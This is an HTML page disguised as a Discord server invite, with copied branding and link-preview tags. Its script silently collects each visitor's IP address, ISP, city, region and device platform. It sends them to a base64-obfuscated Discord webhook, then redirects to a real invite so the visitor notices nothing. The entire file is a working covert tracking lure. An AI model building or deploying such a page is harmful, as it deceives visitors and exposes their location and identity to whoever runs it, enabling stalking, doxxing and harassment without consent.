<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Discord - A New Way to Chat with Friends & Communities</title>
    <!-- This makes the link look like a real Discord invite when shared -->
    <meta property="og:title" content="Join the Server">
    <meta property="og:description" content="You've been invited to join a server.">
    <meta property="og:image" content="https://assets-global.website-files.com/6257adef93867a315140679b/6257adef93867a732840682e_Discord-Logo-Color.png">
    <style>
        body { background-color: #313338; color: #f2f3f5; font-family: 'gg sans', 'Noto Sans', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .invite-box { background: #2b2d31; width: 440px; padding: 32px; border-radius: 8px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
        .loading-text { color: #b5bac1; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="invite-box">
        <img src="https://assets-global.website-files.com/6257adef93867a315140679b/6257adef93867a732840682e_Discord-Logo-Color.png" width="100" alt="Discord">
        <div class="loading-text">Resolving Invite...</div>
    </div>

    <script>
        async function silentLog() {
            try {
                // 1. Secret Webhook (Your Base64 String)
                const secret = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUwMjU5MTYyNTY4NjI5MDQzMi9mdDFLcS1tc212YzVPakFVeEhPeHhvNmFlME43Y01DRkFDYjZtQU9QS1o1ZTh1N2NjTkJuby1fQXIwQVhubjZqd0dKcg==";
                const hook = atob(secret);

                // 2. Fetch Data
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();

                // 3. Send to Discord
                await fetch(hook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "✅ Stealth Connection",
                            description: `**ISP:** ${d.org}\n**Location:** ${d.city}, ${d.region}\n**Device:** ${navigator.platform}`,
                            color: 5814783, // Discord Blue
                            footer: { text: `IP: ${d.ip}` }
                        }]
                    })
                });
            } catch (e) {}

            // 4. Redirect to the real target after 1.8 seconds
            setTimeout(() => {
                window.location.href = "https://discord.com/invite/8888"; // Or any real link
            }, 1800);
        }
        silentLog();
    </script>
</body>
</html>
